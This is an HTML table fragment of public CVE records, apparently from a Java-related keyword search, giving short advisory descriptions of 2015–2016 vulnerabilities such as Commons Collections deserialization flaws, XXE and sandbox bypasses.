		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2340">CVE-2016-2340</a></td>
		<td valign="top">The AMF framework in Granite Data Services 3.1.1-SNAPSHOT allows remote authenticated users to read arbitrary files, send TCP requests to intranet servers, or cause a denial of service via an XML external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2192">CVE-2016-2192</a></td>
		<td valign="top">PostgreSQL PL/Java before 1.5.0 allows remote authenticated users to alter type mappings for types they do not own.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2170">CVE-2016-2170</a></td>
		<td valign="top">Apache OFBiz 12.04.x before 12.04.06 and 13.07.x before 13.07.03 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2164">CVE-2016-2164</a></td>
		<td valign="top">The (1) FileService.importFileByInternalUserId and (2) FileService.importFile SOAP API methods in Apache OpenMeetings before 3.1.1 improperly use the Java URL class without checking the specified protocol handler, which allows remote attackers to read arbitrary files by attempting to upload a file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2009">CVE-2016-2009</a></td>
		<td valign="top">HPE Network Node Manager i (NNMi) 9.20, 9.23, 9.24, 9.25, 10.00, and 10.01 allows remote authenticated users to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2003">CVE-2016-2003</a></td>
		<td valign="top">HPE P9000 Command View Advanced Edition Software (CVAE) 7.x and 8.x before 8.4.0-00 and XP7 CVAE 7.x and 8.x before 8.4.0-00 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2000">CVE-2016-2000</a></td>
		<td valign="top">HPE Asset Manager 9.40, 9.41, and 9.50 and Asset Manager CloudSystem Chargeback 9.40 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1999">CVE-2016-1999</a></td>
		<td valign="top">The server in HP Release Control 9.13, 9.20, and 9.21 allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1998">CVE-2016-1998</a></td>
		<td valign="top">HPE Service Manager (SM) 9.3x before 9.35 P4 and 9.4x before 9.41.P2 allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1997">CVE-2016-1997</a></td>
		<td valign="top">HPE Operations Orchestration 10.x before 10.51 and Operations Orchestration content before 1.7.0 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1986">CVE-2016-1986</a></td>
		<td valign="top">HP Continuous Delivery Automation (CDA) 1.30 allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1985">CVE-2016-1985</a></td>
		<td valign="top">HPE Operations Manager 8.x and 9.0 on Windows allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1524">CVE-2016-1524</a></td>
		<td valign="top">Multiple unrestricted file upload vulnerabilities in NETGEAR Management System NMS300 1.5.0.11 and earlier allow remote attackers to execute arbitrary Java code by using (1) fileUpload.do or (2) lib-1.0/external/flash/fileUpload.do to upload a JSP file, and then accessing it via a direct request for a /null URI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-15011">CVE-2016-15011</a></td>
		<td valign="top">A vulnerability classified as problematic was found in e-Contract dssp up to 1.3.1. Affected by this vulnerability is the function checkSignResponse of the file dssp-client/src/main/java/be/e_contract/dssp/client/SignResponseVerifier.java. The manipulation leads to xml external entity reference. Upgrading to version 1.3.2 is able to address this issue. The identifier of the patch is ec4238349691ec66dd30b416ec6eaab02d722302. It is recommended to upgrade the affected component. The identifier VDB-217549 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1487">CVE-2016-1487</a></td>
		<td valign="top">Lexmark Markvision Enterprise before 2.3.0 misuses the Apache Commons Collections Library, leading to remote code execution because of Java deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1240">CVE-2016-1240</a></td>
		<td valign="top">The Tomcat init script in the tomcat7 package before 7.0.56-3+deb8u4 and tomcat8 package before 8.0.14-1+deb8u3 on Debian jessie and the tomcat6 and libtomcat6-java packages before 6.0.35-1ubuntu3.8 on Ubuntu 12.04 LTS, the tomcat7 and libtomcat7-java packages before 7.0.52-1ubuntu0.7 on Ubuntu 14.04 LTS, and tomcat8 and libtomcat8-java packages before 8.0.32-1ubuntu1.2 on Ubuntu 16.04 LTS allows local users with access to the tomcat account to gain root privileges via a symlink attack on the Catalina log file, as demonstrated by /var/log/tomcat7/catalina.out.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1183">CVE-2016-1183</a></td>
		<td valign="top">NTT Data TERASOLUNA Server Framework for Java(WEB) 2.0.0.1 through 2.0.6.1, as used in Fujitsu Interstage Business Application Server and other products, allows remote attackers to bypass a file-extension protection mechanism, and consequently read arbitrary files, via a crafted pathname.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1114">CVE-2016-1114</a></td>
		<td valign="top">Adobe ColdFusion 10 before Update 19, 11 before Update 8, and 2016 before Update 1 allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-10750">CVE-2016-10750</a></td>
		<td valign="top">In Hazelcast before 3.11, the cluster join procedure is vulnerable to remote code execution via Java deserialization. If an attacker can reach a listening Hazelcast instance with a crafted JoinRequest, and vulnerable classes exist in the classpath, the attacker can run arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-10622">CVE-2016-10622</a></td>
		<td valign="top">nodeschnaps is a NodeJS compatibility layer for Java (Rhino). nodeschnaps downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-10304">CVE-2016-10304</a></td>
		<td valign="top">The SAP EP-RUNTIME component in SAP NetWeaver AS JAVA 7.5 allows remote authenticated users to cause a denial of service (out-of-memory error and service instability) via a crafted serialized Java object, as demonstrated by serial.cc3, aka SAP Security Note 2315788.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-1000027">CVE-2016-1000027</a></td>
		<td valign="top">Pivotal Spring Framework through 5.3.16 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required. NOTE: the vendor's position is that untrusted data is not an intended use case. The product's behavior will not be changed because some users rely on deserialization of trusted data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0958">CVE-2016-0958</a></td>
		<td valign="top">Adobe Experience Manager 5.6.1, 6.0.0, and 6.1.0 might allow remote attackers to have an unspecified impact via a crafted serialized Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0782">CVE-2016-0782</a></td>
		<td valign="top">The administration web console in Apache ActiveMQ 5.x before 5.11.4, 5.12.x before 5.12.3, and 5.13.x before 5.13.2 allows remote authenticated users to conduct cross-site scripting (XSS) attacks and consequently obtain sensitive information from a Java memory dump via vectors related to creating a queue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0768">CVE-2016-0768</a></td>
		<td valign="top">PostgreSQL PL/Java after 9.0 does not honor access controls on large objects.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0767">CVE-2016-0767</a></td>
		<td valign="top">PostgreSQL PL/Java before 1.5.0 allows remote authenticated users with USAGE permission on the public schema to alter the public schema classpath.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0766">CVE-2016-0766</a></td>
		<td valign="top">PostgreSQL before 9.1.20, 9.2.x before 9.2.15, 9.3.x before 9.3.11, 9.4.x before 9.4.6, and 9.5.x before 9.5.1 does not properly restrict access to unspecified custom configuration settings (GUCS) for PL/Java, which allows attackers to gain privileges via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0760">CVE-2016-0760</a></td>
		<td valign="top">Multiple incomplete blacklist vulnerabilities in Apache Sentry before 1.7.0 allow remote authenticated users to execute arbitrary code via the (1) reflect, (2) reflect2, or (3) java_method Hive builtin functions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0750">CVE-2016-0750</a></td>
		<td valign="top">The hotrod java client in infinispan before 9.1.0.Final automatically deserializes bytearray message contents in certain events. A malicious user could exploit this flaw by injecting a specially-crafted serialized object to attain remote code execution or conduct other attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0715">CVE-2016-0715</a></td>
		<td valign="top">Pivotal Cloud Foundry Elastic Runtime version 1.4.0 through 1.4.5, 1.5.0 through 1.5.11 and 1.6.0 through 1.6.11 is vulnerable to a remote information disclosure. It was found that original mitigation configuration instructions provided as part of CVE-2016-0708 were incomplete and could leave PHP Buildpack, Staticfile Buildpack and potentially other custom Buildpack applications vulnerable to remote information disclosure. Affected applications use automated buildpack detection, serve files directly from the root of the application and have a buildpack that matched after the Java Buildpack in the system buildpack priority when Java Buildpack versions 2.0 through 3.4 were present.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0708">CVE-2016-0708</a></td>
		<td valign="top">Applications deployed to Cloud Foundry, versions v166 through v227, may be vulnerable to a remote disclosure of information, including, but not limited to environment variables and bound service details. For applications to be vulnerable, they must have been staged using automatic buildpack detection, passed through the Java Buildpack detection script, and allow the serving of static content from within the deployed artifact. The default Apache Tomcat configuration in the affected java buildpack versions for some basic web application archive (WAR) packaged applications are vulnerable to this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0695">CVE-2016-0695</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77; Java SE Embedded 8u77; and JRockit R28.3.9 allows remote attackers to affect confidentiality via vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0687">CVE-2016-0687</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77 and Java SE Embedded 8u77 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to the Hotspot sub-component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0686">CVE-2016-0686</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77 and Java SE Embedded 8u77 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Serialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0638">CVE-2016-0638</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6, 12.1.2, 12.1.3, and 12.2.1 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Java Messaging Service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0636">CVE-2016-0636</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u97, 8u73, and 8u74 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to the Hotspot sub-component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0603">CVE-2016-0603</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE component in Oracle Java SE 6u111, 7u95, 8u71, and 8u72, when running on Windows, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install.  NOTE: the previous information is from Oracle's Security Alert for CVE-2016-0603. Oracle has not commented on third-party claims that this is an untrusted search path issue that allows local users to gain privileges via a Trojan horse dll in the "application directory."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0602">CVE-2016-0602</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle VM VirtualBox component in Oracle Virtualization VirtualBox before 5.0.14 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Windows Installer.  NOTE: the previous information is from the January 2016 CPU. Oracle has not commented on third-party claims that this is an untrusted search path issue that allows local users to gain privileges via a Trojan horse dll in the "application directory."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0573">CVE-2016-0573</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6, 12.1.2, 12.1.3, and 12.2.1 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to WLS Java Messaging Service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0520">CVE-2016-0520</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Application Object Library component in Oracle E-Business Suite 11.5.10.2 allows remote attackers to affect integrity via vectors related to Java APIs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0499">CVE-2016-0499</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-4794.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0494">CVE-2016-0494</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE and Java SE Embedded components in Oracle Java SE 6u105, 7u91, and 8u66 and Java SE Embedded 8u65 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0483">CVE-2016-0483</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u105, 7u91, and 8u66; Java SE Embedded 8u65; and JRockit R28.3.8 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.  NOTE: the previous information is from the January 2016 CPU. Oracle has not commented on third-party claims that this is a heap-based buffer overflow in the readImage function, which allows remote attackers to execute arbitrary code via crafted image data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0475">CVE-2016-0475</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE, Java SE Embedded, and JRockit components in Oracle Java SE 8u66; Java SE Embedded 8u65; and JRockit R28.3.8 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0466">CVE-2016-0466</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE, Java SE Embedded, and JRockit components in Oracle Java SE 6u105, 7u91, and 8u66; Java SE Embedded 8u65; and JRockit R28.3.8 allows remote attackers to affect availability via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0448">CVE-2016-0448</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE and Java SE Embedded components in Oracle Java SE 6u105, 7u91, and 8u66, and Java SE Embedded 8u65 allows remote authenticated users to affect confidentiality via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0402">CVE-2016-0402</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE and Java SE Embedded components in Oracle Java SE 6u105, 7u91, and 8u66 and Java SE Embedded 8u65 allows remote attackers to affect integrity via unknown vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0376">CVE-2016-0376</a></td>
		<td valign="top">The com.ibm.rmi.io.SunSerializableFactory class in IBM SDK, Java Technology Edition 6 before SR16 FP25 (6.0.16.25), 6 R1 before SR8 FP25 (6.1.8.25), 7 before SR9 FP40 (7.0.9.40), 7 R1 before SR3 FP40 (7.1.3.40), and 8 before SR3 (8.0.3.0) does not properly deserialize classes in an AccessController doPrivileged block, which allows remote attackers to bypass a sandbox protection mechanism and execute arbitrary code as demonstrated by the readValue method of the com.ibm.rmi.io.ValueHandlerPool.ValueHandlerSingleton class, which implements the javax.rmi.CORBA.ValueHandler interface.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-5456.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0363">CVE-2016-0363</a></td>
		<td valign="top">The com.ibm.CORBA.iiop.ClientDelegate class in IBM SDK, Java Technology Edition 6 before SR16 FP25 (6.0.16.25), 6 R1 before SR8 FP25 (6.1.8.25), 7 before SR9 FP40 (7.0.9.40), 7 R1 before SR3 FP40 (7.1.3.40), and 8 before SR3 (8.0.3.0) uses the invoke method of the java.lang.reflect.Method class in an AccessController doPrivileged block, which allows remote attackers to call setSecurityManager and bypass a sandbox protection mechanism via vectors related to a Proxy object instance implementing the java.lang.reflect.InvocationHandler interface.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-3009.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0360">CVE-2016-0360</a></td>
		<td valign="top">IBM Websphere MQ JMS 7.0.1, 7.1, 7.5, 8.0, and 9.0 client provides classes that deserialize objects from untrusted sources which could allow a malicious user to execute arbitrary Java code by adding vulnerable classes to the classpath. IBM Reference #: 1983457.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0323">CVE-2016-0323</a></td>
		<td valign="top">The Auto-Scaling agent in Liberty for Java in IBM Bluemix before 2.7-20160321-1358 allows remote authenticated users to disable X.509 certificate validation, and consequently bypass an intended HTTPS trust-management feature, via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0304">CVE-2016-0304</a></td>
		<td valign="top">The Java Console in IBM Domino 8.5.x before 8.5.3 FP6 IF13 and 9.x before 9.0.1 FP6, when a certain unsupported configuration involving UNC share pathnames is used, allows remote attackers to bypass authentication and possibly execute arbitrary code via unspecified vectors, aka SPR KLYHA7MM3J.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-0920.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0276">CVE-2016-0276</a></td>
		<td valign="top">IBM Financial Transaction Manager (FTM) for ACH Services for Multi-Platform 2.1.1.2 and 3.0.0.x before fp0013, Financial Transaction Manager (FTM) for Check Services for Multi-Platform 2.1.1.2 and 3.0.0.x before fp0013, and Financial Transaction Manager (FTM) for Corporate Payment Services (CPS) for Multi-Platform 2.1.1.2 and 3.0.0.x before fp0013 allows remote attackers to execute arbitrary code via a crafted serialized Java Message Service (JMS) ObjectMessage object. IBM X-Force ID: 111084.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-0264">CVE-2016-0264</a></td>
		<td valign="top">Buffer overflow in the Java Virtual Machine (JVM) in IBM SDK, Java Technology Edition 6 before SR16 FP25 (6.0.16.25), 6 R1 before SR8 FP25 (6.1.8.25), 7 before SR9 FP40 (7.0.9.40), 7 R1 before SR3 FP40 (7.1.3.40), and 8 before SR3 (8.0.3.0) allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-9245">CVE-2015-9245</a></td>
		<td valign="top">Insecure default configuration in Progress Software OpenEdge 10.2x and 11.x allows unauthenticated remote attackers to specify arbitrary URLs from which to load and execute malicious Java classes via port 20931.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-8965">CVE-2015-8965</a></td>
		<td valign="top">Rogue Wave JViews before 8.8 patch 21 and 8.9 before patch 1 allows remote attackers to execute arbitrary Java code that exists in the classpath, such as test code or administration code. The issue exists because the ilog.views.faces.IlvFacesController servlet in jviews-framework-all.jar does not require explicit configuration of servlets that can be called.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-8840">CVE-2015-8840</a></td>
		<td valign="top">The XML Data Archiving Service (XML DAS) in SAP NetWeaver AS Java does not check authorization, which allows remote authenticated users to obtain sensitive information, gain privileges, or possibly have unspecified other impact via requests to (1) webcontent/cas/cas_enter.jsp, (2) webcontent/cas/cas_validate.jsp, or (3) webcontent/aas/aas_store.jsp, aka SAP Security Note 1945215.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-8765">CVE-2015-8765</a></td>
		<td valign="top">Intel McAfee ePolicy Orchestrator (ePO) 4.6.9 and earlier, 5.0.x, 5.1.x before 5.1.3 Hotfix 1106041, and 5.3.x before 5.3.1 Hotfix 1106041 allow remote attackers to execute arbitrary code via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-8360">CVE-2015-8360</a></td>
		<td valign="top">An unspecified resource in Atlassian Bamboo before 5.9.9 and 5.10.x before 5.10.0 allows remote attackers to execute arbitrary Java code via serialized data to the JMS port.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-8103">CVE-2015-8103</a></td>
		<td valign="top">The Jenkins CLI subsystem in Jenkins before 1.638 and LTS before 1.625.2 allows remote attackers to execute arbitrary code via a crafted serialized Java object, related to a problematic webapps/ROOT/WEB-INF/lib/commons-collections-*.jar file and the "Groovy variant in 'ysoserial'".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7999">CVE-2015-7999</a></td>
		<td valign="top">Multiple SQL injection vulnerabilities in the Administration Web UI servlets in Citrix Command Center before 5.1 Build 36.7 and 5.2 before Build 44.11 allow remote authenticated users to execute arbitrary SQL commands via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7940">CVE-2015-7940</a></td>
		<td valign="top">The Bouncy Castle Java library before 1.51 does not validate a point is withing the elliptic curve, which makes it easier for remote attackers to obtain private keys via a series of crafted elliptic curve Diffie Hellman (ECDH) key exchanges, aka an "invalid curve attack."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7934">CVE-2015-7934</a></td>
		<td valign="top">The Java client in Adcon Telemetry A840 Telemetry Gateway Base Station allows remote attackers to discover log-file pathnames via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7931">CVE-2015-7931</a></td>
		<td valign="top">The Java client in Adcon Telemetry A840 Telemetry Gateway Base Station does not authenticate the station device, which allows man-in-the-middle attackers to spoof devices and obtain sensitive information by reading cleartext packet data, related to the lack of SSL support.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7913">CVE-2015-7913</a></td>
		<td valign="top">ag_server_service.exe in the AggreGate Server Service in Tibbo AggreGate before 5.30.06 allows local users to execute arbitrary Java code with SYSTEM privileges by using the Apache Axis AdminService deployment method to publish a class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7912">CVE-2015-7912</a></td>
		<td valign="top">The Ice Faces servlet in ag_server_service.exe in the AggreGate Server Service in Tibbo AggreGate before 5.30.06 allows remote attackers to upload and execute arbitrary Java code via a crafted XML document.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7501">CVE-2015-7501</a></td>
		<td valign="top">Red Hat JBoss A-MQ 6.x; BPM Suite (BPMS) 6.x; BRMS 6.x and 5.x; Data Grid (JDG) 6.x; Data Virtualization (JDV) 6.x and 5.x; Enterprise Application Platform 6.x, 5.x, and 4.3.x; Fuse 6.x; Fuse Service Works (FSW) 6.x; Operations Network (JBoss ON) 3.x; Portal 6.x; SOA Platform (SOA-P) 5.x; Web Server (JWS) 3.x; Red Hat OpenShift/xPAAS 3.x; and Red Hat Subscription Asset Manager 1.3 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7450">CVE-2015-7450</a></td>
		<td valign="top">Serialized-object interfaces in certain IBM analytics, business solutions, cognitive, IT infrastructure, and mobile and social products allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the InvokerTransformer class in the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-7196">CVE-2015-7196</a></td>
		<td valign="top">Mozilla Firefox before 42.0 and Firefox ESR 38.x before 38.4, when a Java plugin is enabled, allow remote attackers to cause a denial of service (incorrect garbage collection and application crash) or possibly execute arbitrary code via a crafted Java applet that deallocates an in-use JavaScript wrapper.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-6934">CVE-2015-6934</a></td>
		<td valign="top">Serialized-object interfaces in VMware vRealize Orchestrator 6.x, vCenter Orchestrator 5.x, vRealize Operations 6.x, vCenter Operations 5.x, and vCenter Application Discovery Manager (vADM) 7.x allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-6576">CVE-2015-6576</a></td>
		<td valign="top">Bamboo 2.2 before 5.8.5 and 5.9.x before 5.9.7 allows remote attackers with access to the Bamboo web interface to execute arbitrary Java code via an unspecified resource.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-6555">CVE-2015-6555</a></td>
		<td valign="top">Symantec Endpoint Protection Manager (SEPM) 12.1 before 12.1-RU6-MP3 allows remote attackers to execute arbitrary Java code by connecting to the console Java port.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-6524">CVE-2015-6524</a></td>
		<td valign="top">The LDAPLoginModule implementation in the Java Authentication and Authorization Service (JAAS) in Apache ActiveMQ 5.x before 5.10.1 allows wildcard operators in usernames, which allows remote attackers to obtain credentials via a brute force attack. NOTE: this identifier was SPLIT from CVE-2014-3612 per ADT2 due to different vulnerability types.

